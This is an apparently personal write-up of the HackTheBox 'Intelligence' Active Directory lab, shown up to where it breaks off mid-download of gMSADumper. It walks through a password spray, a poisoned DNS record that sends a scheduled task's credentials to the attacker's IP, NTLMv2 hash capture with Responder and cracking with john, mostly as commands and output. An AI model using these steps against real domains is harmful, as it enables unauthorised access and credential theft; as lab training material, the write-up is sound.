---
title: "Walk-through of Intelligence from HackTHeBox"
header:
  teaser: /assets/images/2021-10-04-21-55-09.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - Exiftool
  - Feroxbuster
  - CrackMapExec
  - SMBMap
  - SMBClient
  - dnstool
  - Responder
  - LDAPdomaindump
  - Pywerview
  - gMSADumper
  - Impacket
  - getST.py
---

## Machine Information

![intelligence](/assets/images/2021-10-04-21-55-09.png)

Intelligence is a medium machine on HackTheBox. This is a Windows box hosting a DC and many other services. Our starting point is a web site and with some brute forcing we find many PDFs. Hidden amongst them we find credentials which we use to access an SMB share. From there we find a script that points us to a scheduled task that we take advantage of by pointing DNS to our attack machine. Using Responder we grab a users hash, which is easily cracked. Using these credentials we grab a service accounts hash, and with that we create a service ticket to impersonate the administrator. It sounds simple but this one took me way too long!

<!--more-->

Skills required are web and OS enumeration, plus an understanding of basic attack methods against Active Directory. Skills learned are many, including using CrackMapExec, SMBMap, LDAP searching, Responder, Impacket scripts and Kerberos ticket creation.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Intelligence](https://www.hackthebox.eu/home/machines/profile/357) |
| Machine Release Date | 3rd July 2021 |
| Date I Completed It | 10th October 2021 |
| Distribution Used | Kali 2021.3 – [Release Info](https://www.kali.org/blog/kali-linux-2021-3-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.248 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/intelligence]
└─# nmap -p$ports -sC -sV -oA intel 10.10.10.248
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-05 20:53 BST
Nmap scan report for 10.10.10.248
Host is up (0.026s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-06 02:53:33Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-06T02:55:03+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-06T02:55:03+00:00; +7h00m00s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-06T02:55:03+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-10-06T02:55:03+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
50919/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-10-06T02:54:24
|_  start_date: N/A
```

We can see the machine name so let's add it:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# echo "10.10.10.248 intelligence.htb" >> /etc/hosts
```

So it's a Windows box that's a DC as well as running a number of other services. Let's start by looking at the website on port 80:

![intelligence](/assets/images/2021-10-05-22-02-11.png)

There's not a lot on the site, but we do find links to two documents. Let's grab them:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# wget http://intelligence.htb/documents/2020-12-15-upload.pdf
--2021-10-05 22:03:38--  http://intelligence.htb/documents/2020-12-15-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 27242 (27K) [application/pdf]
Saving to: ‘2020-12-15-upload.pdf’
2020-12-15-upload.pdf        100%[================>]  26.60K  --.-KB/s    in 0.05s
2021-10-05 22:03:38 (541 KB/s) - ‘2020-12-15-upload.pdf’ saved [27242/27242]

┌──(root💀kali)-[~/htb/intelligence]
└─# wget http://intelligence.htb/documents/2020-01-01-upload.pdf
--2021-10-05 22:04:16--  http://intelligence.htb/documents/2020-01-01-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26835 (26K) [application/pdf]
Saving to: ‘2020-01-01-upload.pdf’
2020-01-01-upload.pdf        100%[=================>]  26.21K  --.-KB/s    in 0.03s
2021-10-05 22:04:16 (1.02 MB/s) - ‘2020-01-01-upload.pdf’ saved [26835/26835]
```

## EXIF Data Exraction

There's nothing interesting inside these PDFs, just lorem ipsum filler. Let's look at EXIF data:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# exiftool
Command 'exiftool' not found, but can be installed with:
apt install libimage-exiftool-perl
Do you want to install it? (N/y)y
apt install libimage-exiftool-perl
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following additional packages will be installed:
  libarchive-zip-perl libmime-charset-perl libsombok3 libunicode-linebreak-perl
The following NEW packages will be installed:
  libarchive-zip-perl libimage-exiftool-perl libmime-charset-perl libsombok3 libunicode-linebreak-perl
0 upgraded, 5 newly installed, 0 to remove and 0 not upgraded.
Need to get 3,942 kB of archives.
After this operation, 22.9 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://kali.download/kali kali-rolling/main amd64 libarchive-zip-perl all 1.68-1 [104 kB]
Get:2 http://http.kali.org/kali kali-rolling/main amd64 libimage-exiftool-perl all 12.31+dfsg-1 [3,670 kB]
Get:3 http://kali.download/kali kali-rolling/main amd64 libmime-charset-perl all 1.012.2-1 [35.4 kB]
Get:4 http://http.kali.org/kali kali-rolling/main amd64 libsombok3 amd64 2.4.0-2+b1 [31.4 kB]
Get:5 http://http.kali.org/kali kali-rolling/main amd64 libunicode-linebreak-perl amd64 0.0.20190101-1+b3 [102 kB]
Fetched 3,942 kB in 1s (3,613 kB/s)
<SNIP>
Processing triggers for libc-bin (2.32-4) ...
Processing triggers for man-db (2.9.4-2) ...
Processing triggers for kali-menu (2021.4.0) ...

┌──(root💀kali)-[~/htb/intelligence]
└─# exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.31
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 18:00:00+01:00
File Access Date/Time           : 2021:10:05 22:04:16+01:00
File Inode Change Date/Time     : 2021:10:05 22:04:16+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee

┌──(root💀kali)-[~/htb/intelligence]
└─# exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.31
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:04:01 18:00:00+01:00
File Access Date/Time           : 2021:10:05 22:03:38+01:00
File Inode Change Date/Time     : 2021:10:05 22:03:38+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

## Generating Wordlist

We have two files named with dates, one at the start of 2020, and one near the end. We also have what looks like two usernames, William.Lee and Jose.Williams. A next logical step is to see if we can brute force finding other documents. The naming format is simple to create a list from, I searched and found [this](https://www.w3resource.com/python-exercises/date-time-exercise/python-date-time-exercise-50.php) Python script that I changed slightly:

```python
from datetime import timedelta, date

def daterange(date1, date2):
    for n in range(int ((date2 - date1).days)+1):
        yield date1 + timedelta(n)

start_dt = date(2020, 1, 1)
end_dt = date(2020, 12, 31)
for dt in daterange(start_dt, end_dt):
    print(dt.strftime("%Y-%m-%d-upload.pdf"))
```

This creates me a list of potential file names, one for every day of the year 2020. I can save those to a file called dates.txt and use with feroxbuster:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# feroxbuster --wordlist dates.txt --url http://intelligence.htb/documents --output results.txt
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://intelligence.htb/documents
 🚀  Threads               │ 50
 📖  Wordlist              │ dates.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💾  Output File           │ results.txt
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200      126l      413w    11632c http://intelligence.htb/documents/2020-01-20-upload.pdf
200      135l      429w    11557c http://intelligence.htb/documents/2020-01-23-upload.pdf
200      131l      410w    11228c http://intelligence.htb/documents/2020-02-17-upload.pdf
<SNIP>
200      126l      403w    11480c http://intelligence.htb/documents/2020-12-28-upload.pdf
200      208l      814w    26825c http://intelligence.htb/documents/2020-12-24-upload.pdf
200      190l      690w    25109c http://intelligence.htb/documents/2020-12-30-upload.pdf
200      199l      789w    26762c http://intelligence.htb/documents/2020-12-10-upload.pdf
[####################] - 0s       366/366     0s      found:81      errors:0      
[####################] - 0s       366/366     837/s   http://intelligence.htb/documents
```

We found 81 files. That list is output to a file called results.txt:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# cat results.txt                                                 
200      126l      413w    11632c http://intelligence.htb/documents/2020-01-20-upload.pdf
200      135l      429w    11557c http://intelligence.htb/documents/2020-01-23-upload.pdf
200      131l      410w    11228c http://intelligence.htb/documents/2020-02-17-upload.pdf
200      208l      768w    26835c http://intelligence.htb/documents/2020-01-01-upload.pdf
200      198l      764w    27002c http://intelligence.htb/documents/2020-01-02-upload.pdf
200      130l      415w    11543c http://intelligence.htb/documents/2020-02-28-upload.pdf
200      192l      759w    26706c http://intelligence.htb/documents/2020-01-30-upload.pdf
200      195l      778w    27522c http://intelligence.htb/documents/2020-01-04-upload.pdf
200      197l      782w    25245c http://intelligence.htb/documents/2020-02-11-upload.pdf
<SNIP>
```

We can tidy that up using awk:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# cat results.txt | awk '{ print $5 }' 
http://intelligence.htb/documents/2020-01-20-upload.pdf
http://intelligence.htb/documents/2020-01-23-upload.pdf
http://intelligence.htb/documents/2020-02-17-upload.pdf
http://intelligence.htb/documents/2020-01-01-upload.pdf
http://intelligence.htb/documents/2020-01-02-upload.pdf
http://intelligence.htb/documents/2020-02-28-upload.pdf
```

## Mass File Download

That looks better, now we can pipe that to wget to download all the files:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# cat results.txt | awk '{ print $5 }' | xargs wget
--2021-10-05 22:45:24--  http://intelligence.htb/documents/2020-01-20-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.10.10.248
Connecting to intelligence.htb (intelligence.htb)|10.10.10.248|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11632 (11K) [application/pdf]
Saving to: ‘2020-01-20-upload.pdf’
2020-01-20-upload.pdf      100%[=================>]  11.36K  --.-KB/s    in 0.004s
2021-10-05 22:45:24 (2.71 MB/s) - ‘2020-01-20-upload.pdf’ saved [11632/11632]

--2021-10-05 22:45:24--  http://intelligence.htb/documents/2020-01-23-upload.pdf
Reusing existing connection to intelligence.htb:80.
HTTP request sent, awaiting response... 200 OK
Length: 11557 (11K) [application/pdf]
Saving to: ‘2020-01-23-upload.pdf’
2020-01-23-upload.pdf      100%[=================>]  11.29K  --.-KB/s    in 0.001s
2021-10-05 22:45:24 (8.10 MB/s) - ‘2020-01-23-upload.pdf’ saved [11557/11557]
<SNIP>
```

We have all the files, but there's too many to look through manually. Earlier with exiftool we saw there was a username in the Creator field, let's look at the files we downloaded using strings:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# strings *.pdf | grep Creator                                                                                           
/Creator (TeX)
/Creator (William.Lee)
/Creator (TeX)
/Creator (Scott.Scott)
/Creator (TeX)
<SNIP>
```

We can extract with strings, let's create a list of unique usernames and pass to a file:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# strings *.pdf | grep Creator | grep -v TeX | awk '{print $2}' | cut -d '(' -f 2 | cut -d ')' -f 1 | sort | uniq
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
<SNIP>
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee

┌──(root💀kali)-[~/htb/intelligence]
└─# strings *.pdf | grep Creator | grep -v TeX | awk '{print $2}' | cut -d '(' -f 2 | cut -d ')' -f 1 | sort | uniq > users.txt
```

## Data Extraction

Next we want to search the contents of all those PDF files to save time. I found [this](https://www.linuxuprising.com/2019/05/how-to-convert-pdf-to-text-on-linux-gui.html) converter, so with that installed let's turn all those PDF files in to text ones:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# for file in *.pdf; do pdftotext -layout "$file"; done
```

Now we have a text file for each PDF one, we can search them all at once for something obvious like password:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# grep -rl "password" *.txt
2020-06-04-upload.txt

┌──(root💀kali)-[~/htb/intelligence]
└─# cat 2020-06-04-upload.txt
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
<HIDDEN>
After logging in please change your password as soon as possible.
```

Not too surprising that we find something!

## CrackMapExec

Now we have a list of usernames and a possible password. Let's use crackmapexec to do a password spray:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# crackmapexec smb intelligence.htb -u ./users.txt -p '<HIDDEN>'
SMB    10.10.10.248    445    DC    [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB    10.10.10.248    445    DC    [-] intelligence.htb\Anita.Roberts:<HIDDEN> STATUS_LOGON_FAILURE 
SMB    10.10.10.248    445    DC    [-] intelligence.htb\Brian.Baker:<HIDDEN> STATUS_LOGON_FAILURE 
SMB    10.10.10.248    445    DC    [-] intelligence.htb\Brian.Morris:<HIDDEN> STATUS_LOGON_FAILURE 
<SNIP>
SMB    10.10.10.248    445    DC    [+] intelligence.htb\Tiffany.Molina:<HIDDEN>
```

## SMBMap

We find Tiffany has forgotten to change her password! We can use smbmap to enumerate the SMB shares:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# smbmap -u Tiffany.Molina -p <HIDDEN> -H intelligence.htb
[+] IP: intelligence.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ ONLY
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        Users                                                   READ ONLY
```

We have read access to Users and one called IT. Instead of walking around the shares looking manually, we can get smbmap to list everything we have access to:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H intelligence.htb -R
[+] IP: intelligence.htb:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        <SNIP>
        IT                                                      READ ONLY
        .\IT\*
        fr--r--r--             1046 Mon Apr 19 01:50:58 2021    downdetector.ps1
        <SNIP>
        Users                                                   READ ONLY
        .\Users\*
        dr--r--r--                0 Mon Apr 19 01:18:39 2021    Administrator
        dr--r--r--                0 Mon Apr 19 04:16:30 2021    All Users
        dw--w--w--                0 Mon Apr 19 03:17:40 2021    Default
        dr--r--r--                0 Mon Apr 19 04:16:30 2021    Default User
        fr--r--r--              174 Mon Apr 19 04:15:17 2021    desktop.ini
        dw--w--w--                0 Mon Apr 19 01:18:39 2021    Public
        dr--r--r--                0 Mon Apr 19 02:20:26 2021    Ted.Graves
        dr--r--r--                0 Mon Apr 19 01:51:46 2021    Tiffany.Molina
        <SNIP>
        .\Users\Tiffany.Molina\Desktop\*
        fw--w--w--               34 Thu Oct  7 12:55:49 2021    user.txt
```

Over 260 files were returned, so we saved a lot of time dumping the list instead of looking by hand. I've cut out most of it and left the three things of interest:

```text
IT Share has a PowerShell script called downdetector.ps1
User folder has another user called Ted.Graves
User flag is on Tiffany's desktop
```

## User Flag

Let's get the flag before looking at the PowerShell script:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# smbclient //intelligence.htb/Users -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> cd Tiffany.Molina\Desktop\
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

┌──(root💀kali)-[~/htb/intelligence]
└─# cat user.txt 
<HIDDEN>
```

## PowerShell Loot

Now let's have a look at that PowerShell script:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# smbclient  //intelligence.htb/IT -U 'Tiffany.Molina'
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (9.0 KiloBytes/sec) (average 9.0 KiloBytes/sec)
```

```powershell
┌──(root💀kali)-[~/htb/intelligence]
└─# cat downdetector.ps1
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

We have a simple script that has a loop to retrieve all records from AD where the name is like web*. It then uses Invoke-WebRequest with the list of names and attempts to authenticate. So we know that we need to add a DNS record that points to us, and then we can capture that authentication request.

## DNS Poisoning

First we can use the Dirk Janm's [krbrelayx](https://github.com/dirkjanm/krbrelayx) toolkit to add our record:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# git clone https://github.com/dirkjanm/krbrelayx.git
Cloning into 'krbrelayx'...
remote: Enumerating objects: 98, done.
remote: Total 98 (delta 0), reused 0 (delta 0), pack-reused 98
Receiving objects: 100% (98/98), 65.76 KiB | 1.11 MiB/s, done.
Resolving deltas: 100% (48/48), done.

┌──(root💀kali)-[~/htb/intelligence]
└─# cd krbrelayx

┌──(root💀kali)-[~/htb/intelligence/krbrelayx]
└─# python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p '<HIDDEN>' -a add -r 'webpencer.intelligence.htb' -d 10.10.14.251 10.10.10.248
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/root/htb/intelligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```

Above we've used the dnstool script to add a record called webpencer, we point that entry to our Kali IP of 10.10.14.251.

## Responder

Now we start responder and wait for that five minute cycle for the script to reach out to us and try to authenticate:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# responder -I tun0 -A
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|
           NBT-NS, LLMNR & MDNS Responder 3.0.6.0
  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    <SNIP>
[+] Servers:
    <SNIP>
[+] HTTP Options:
    <SNIP>
[+] Poisoning Options:
    Analyze Mode               [ON]
    <SNIP>
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.251]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']
[+] Current Session Variables:
    Responder Machine Name     [WIN-ZQMKCOX922L]
    Responder Domain Name      [45TT.LOCAL]
    Responder DCE-RPC Port     [49138]

[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.

[+] Listening for events...                          
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:98592689b95ecf6e:435A2306687E740FF0DDFA17CAF82E4B<SNIP>9003E0048005400540050002F00770065006200700065006E006300650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

## Hash Cracking

After a few minutes we've captured Ted.Graves password hash. We can use JohnTheRipper to try and crack it:

```test
┌──(root💀kali)-[~/htb/intelligence]
└─# nth --file hash.txt 
  _   _                           _____ _           _          _   _           _     
 | \ | |                         |_   _| |         | |        | | | |         | |    
 |  \| | __ _ _ __ ___   ___ ______| | | |__   __ _| |_ ______| |_| | __ _ ___| |__  
 | . ` |/ _` | '_ ` _ \ / _ \______| | | '_ \ / _` | __|______|  _  |/ _` / __| '_ \ 
 | |\  | (_| | | | | | |  __/      | | | | | | (_| | |_       | | | | (_| \__ \ | | |
 \_| \_/\__,_|_| |_| |_|\___|      \_/ |_| |_|\__,_|\__|      \_| |_/\__,_|___/_| |_|
https://twitter.com/bee_sec_san
https://github.com/HashPals/Name-That-Hash 

Ted.Graves::intelligence:98592689b95ecf6e:435A2306687E740FF0DDFA17CAF82E4B<SNIP>9003E0048005400540050002F00770065006200700065006E006300650072002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000

Most Likely 
NetNTLMv2, HC: 5600 JtR: netntlmv2

┌──(root💀kali)-[~/htb/intelligence]
└─# john hash.txt -format=netntlmv2 -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<HIDDEN>        (Ted.Graves)
1g 0:00:00:05 DONE (2021-10-07 22:19) 0.1941g/s 2100Kp/s 2100Kc/s 2100KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

## Service Accounts

That took just a few seconds to crack. However I got a little stuck as those credentials didn't work where I thought they would. With no way forward on SMB I went back to the PDFs downloaded and searched for Ted:

```text
┌──(root💀kali)-[~/htb/intelligence]
└─# grep -rl "Ted" *.txt | cat $file
2020-12-30-upload.txt

┌──(root💀kali)-[~/htb/intelligence]
└─# cat 2020-12-30-upload.txt
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

## LDAP Dump

Interesting that this file mentioned a security audit and they are in the process of locking down service accounts. A little searching found [this](https://book.hacktricks.xyz/pentesting/pentesting-ldap) from hacktricks. I have valid credentials for Ted so looked at [ldapsearch](https://github.com/dirkjanm/ldapdomaindump), which is another tool from Dirk Janm:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# ldapdomaindump 10.10.10.248 -u 'intelligence\Ted.Graves' -p '<HIDDEN>'
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished

┌──(root💀kali)-[~/htb/intelligence]
└─# ldd2pretty --directory .

    +--------------------------------------+
    | Getting Domain Sid For               |
    +--------------------------------------+
    
[+] Domain Name: intelligence
Domain Sid: S-1-5-21-4210132550-3389855604-3437519686

    +-----------------------------------------+
    | Password Policy Information             |
    +-----------------------------------------+
    
[+] Password Info for Domain: INTELLIGENCE
        [+] Minimum password length:  5
        [+] Password history length: 0
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Maximum password age: 999999999 days, 23:59:59.999999
        [+] Minimum password age: 0:00:00
        [+] Reset Account Lockout Counter: 0:00:00
        [+] Account Lockout Threshold: 0
        [+] Forced Log off Time: Not Set

    +------------------------+
    | Users Infos            |
    +------------------------+
    
Account: INTELLIGENCE\Ted.Graves        Name: Ted Graves        Desc: (null)
Account: INTELLIGENCE\Laura.Lee         Name: Laura Lee Desc:   Desc: (null)
Account: INTELLIGENCE\Jason.Patterson   Name: Jason Patterson   Desc: (null)
Account: INTELLIGENCE\Jeremy.Mora       Name: Jeremy Mora       Desc: (null)
Account: INTELLIGENCE\James.Curbow      Name: James Curbow      Desc: (null)
<SNIP>
```

## Constrained Delegation

I've dumped everything we have access to from AD, so the output goes on for a long time. This is part that we are interested in:

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# grep "DELEGATION" *.grep 
domain_computers.grep:svc_int   svc_int$  svc_int.intelligence.htb  10/08/21 04:49:52   WORKSTATION_ACCOUNT, TRUSTED_TO_AUTH_FOR_DELEGATION
domain_computers.grep:DC        DC$       dc.intelligence.htb       10/08/21 03:55:22   SERVER_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
```

## Pywerview

More searching found [this](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation) helpful article. It mentions about computer objects trusted for delegation, so I grabbed more detailed info using the Python version of PowerView from [here](https://github.com/the-useless-one/pywerview):

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# git clone https://github.com/the-useless-one/pywerview.git
Cloning into 'pywerview'...
remote: Enumerating objects: 1731, done.
remote: Counting objects: 100% (571/571), done.
remote: Compressing objects: 100% (323/323), done.
remote: Total 1731 (delta 425), reused 385 (delta 247), pack-reused 1160
Receiving objects: 100% (1731/1731), 383.68 KiB | 1.76 MiB/s, done.
Resolving deltas: 100% (1235/1235), done.

┌──(root💀kali)-[~/htb/intelligence/pywerview]
└─# python3 ./pywerview.py get-netcomputer -u Ted.Graves -p <HIDDEN> -w intelligence.htb --computername svc_int.intelligence.htb -t 10.10.10.248 --full-data
```

From the lengthy output, this is the key parts:

```text
accountexpires:                 never
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
dnshostname:                    svc_int.intelligence.htb
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
name:                           svc_int
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                    msDS-GroupManagedServiceAccount
samaccountname:                 svc_int$
useraccountcontrol:             ['WORKSTATION_TRUST_ACCOUNT', 'TRUSTED_TO_AUTH_FOR_DELEGATION']
```

## gMSADumper

We have a group managed service account that is trusted for delegation to WWW. With Ted's access we can grab the hash of that account using [gMSADumper](https://github.com/micahvandeusen/gMSADumper):

```sh
┌──(root💀kali)-[~/htb/intelligence]
└─# wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py
--2021-10-08 15:12:07--  https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.110.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4609 (4.5K) [text/plain]
